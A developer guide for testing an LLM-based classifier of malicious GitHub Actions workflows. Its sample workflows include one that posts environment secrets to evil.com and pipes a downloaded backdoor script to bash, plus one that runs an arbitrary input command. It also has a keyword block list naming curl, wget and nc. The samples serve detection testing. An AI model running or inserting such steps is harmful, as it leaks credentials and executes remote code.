# Real LLM Integration Testing Guide

This guide shows you how to test your LLM integration with actual API calls to verify that your workflow analysis works with real AI models.

## 🎯 Available Testing Methods

### 1. **Manual Command-Line Testing** (Recommended for Quick Tests)
```bash
npm run test:llm-manual
```

**Features:**
- Test specific workflow files
- Choose between different APIs (GitHub Copilot, OpenAI)
- See detailed analysis results
- Quick and simple

**Examples:**
```bash
# Test with default good workflow
npm run test:llm-manual

# Test a specific workflow file
npm run test:llm-manual -- --workflow=fixtures/malicious-workflow.yml

# Use OpenAI instead of GitHub Copilot
npm run test:llm-manual -- --api=openai
```

### 2. **Interactive CLI Testing** (Best for Experimentation)
```bash
npm run test:llm-interactive
```

**Features:**
- Interactive prompts guide you through testing
- Paste custom workflow content
- Load example workflows
- Test multiple workflows in one session
- Choose API provider

### 3. **Automated Live API Tests** (Best for CI/CD)
```bash
npm run test:live
```

**Features:**
- Runs all fixture workflows through real API
- Validates API responses
- Tests error handling with invalid keys
- Suitable for automated testing

## 🔑 API Key Setup

Before testing, you need to set up API keys:

### GitHub Copilot API
```bash
export GITHUB_TOKEN="your-github-token"
# OR
export COPILOT_API_KEY="your-copilot-key"
```

### OpenAI API
```bash
export OPENAI_API_KEY="your-openai-key"
```

### Getting API Keys

#### GitHub Token
1. Go to GitHub → Settings → Developer settings → Personal access tokens
2. Generate new token with `read:user` scope
3. Some endpoints may require additional scopes

#### OpenAI API Key
1. Visit https://platform.openai.com/api-keys
2. Create new secret key
3. Note: This will incur usage costs

## 🚀 Quick Start Example

Let's test a malicious workflow:

```bash
# 1. Set your API key
export GITHUB_TOKEN="your-token-here"

# 2. Run interactive test
npm run test:llm-interactive

# 3. Choose option 1 (example workflow)
# 4. Select malicious-workflow.yml
# 5. See the AI analysis!
```

## 📋 Testing Different Workflow Types

### Safe CI Workflow
```yaml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: '18'
    - run: npm ci
    - run: npm test
```

**Expected Result:** `allow` with high confidence

### Malicious Workflow
```yaml
name: Evil
on: workflow_dispatch
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
    - run: |
        env | curl -X POST -d @- https://evil.com/steal
        wget https://malware.com/backdoor.sh | bash
```

**Expected Result:** `block` with high confidence, multiple detected threats

### Suspicious Workflow
```yaml
name: Dynamic
on: workflow_dispatch
  inputs:
    command:
      description: 'Command to run'
      required: true
jobs:
  execute:
    runs-on: ubuntu-latest
    steps:
    - run: ${{ github.event.inputs.command }}
```

**Expected Result:** `review` with moderate confidence

## 🧪 Manual Testing Workflow

1. **Choose your workflow:**
   - Use existing fixtures: `fixtures/good-workflow.yml`
   - Create custom workflow content
   - Load from file path

2. **Select API:**
   - GitHub Copilot (default)
   - OpenAI (if key available)

3. **Review results:**
   - Malicious detection
   - Confidence score
   - Detected threats
   - LLM reasoning

4. **Iterate:**
   - Modify workflow content
   - Test edge cases
   - Verify configuration impact

## 📊 Understanding Results

### Analysis Response Format
```json
{
  "isMalicious": false,
  "confidence": 95,
  "reasoning": "This is a standard CI workflow...",
  "detectedThreats": [],
  "recommendation": "allow"
}
```

### Recommendation Meanings
- **`allow`**: Workflow is safe, proceed with deployment
- **`block`**: Workflow is malicious, block deployment
- **`review`**: Ambiguous case, requires manual review

### Confidence Scores
- **90-100%**: Very high confidence in analysis
- **70-89%**: High confidence
- **50-69%**: Moderate confidence (often leads to "review")
- **0-49%**: Low confidence (usually from API errors)

## 🔧 Configuration Testing

You can modify the configuration in the test scripts to see how it affects analysis:

```typescript
// Edit scripts/test-llm-manual.ts
protectionRules: {
  enabledEnvironments: ['production'],
  blockedKeywords: ['curl', 'wget', 'sudo', 'nc'], // Add more keywords
  allowedActions: ['actions/checkout@v4'],         // Restrict actions
  blockOnMaliciousDetection: true
}
```

## 🐛 Troubleshooting

### Common Issues

**"No API keys found"**
```bash
# Check your environment variables
echo $GITHUB_TOKEN
echo $OPENAI_API_KEY

# Set them if missing
export GITHUB_TOKEN="your-token"
```

**"401 Unauthorized"**
- Check if your API key is valid
- Ensure key has necessary permissions
- For GitHub: try regenerating the token

**"429 Rate Limited"**
- Wait a few minutes before retrying
- Consider using a different API if available

**"Network timeout"**
- Check internet connection
- API might be experiencing issues

### Testing Error Scenarios

```bash
# Test with invalid API key
GITHUB_TOKEN="invalid-key" npm run test:llm-manual

# Test network timeout simulation
# (modify scripts to add shorter timeout)
```

## 💡 Best Practices

1. **Start with examples**: Use fixture files to understand expected behavior
2. **Test incrementally**: Start with simple workflows, add complexity
3. **Compare APIs**: Try both GitHub Copilot and OpenAI for comparison
4. **Document results**: Keep track of interesting test cases
5. **Respect rate limits**: Add delays between requests in automated testing

## 🔒 Security Considerations

- Never commit API keys to version control
- Use environment variables for sensitive data
- Be aware that workflow content is sent to external APIs
- Consider using test/dummy data for sensitive workflows

## 📈 Advanced Testing

### Custom Test Scripts
Create your own test scripts using the CopilotService:

```typescript
import { CopilotService } from './src/services/copilot-service';
import { ConfigService } from './src/services/config-service';

const service = new CopilotService(new ConfigService());
const analysis = await service.analyzeWorkflow(workflowContent, config);
console.log(analysis);
```

### Batch Testing
Test multiple workflows programmatically:

```bash
# This will test all fixture files
npm run test:live
```

### Performance Testing
Measure response times and API reliability:

```typescript
const startTime = Date.now();
const analysis = await service.analyzeWorkflow(workflow, config);
const duration = Date.now() - startTime;
console.log(`Analysis took ${duration}ms`);
```

## 🎉 Expected Outcomes

After running these tests, you should see:

1. **Safe workflows** → `allow` recommendations
2. **Malicious workflows** → `block` recommendations with specific threats
3. **Ambiguous workflows** → `review` recommendations
4. **API errors** → Safe fallback behavior
5. **Configuration respect** → Blocked keywords and allowed actions influence analysis

This validates that your LLM integration is working correctly and will protect your environments from malicious GitHub Actions workflows! 🛡️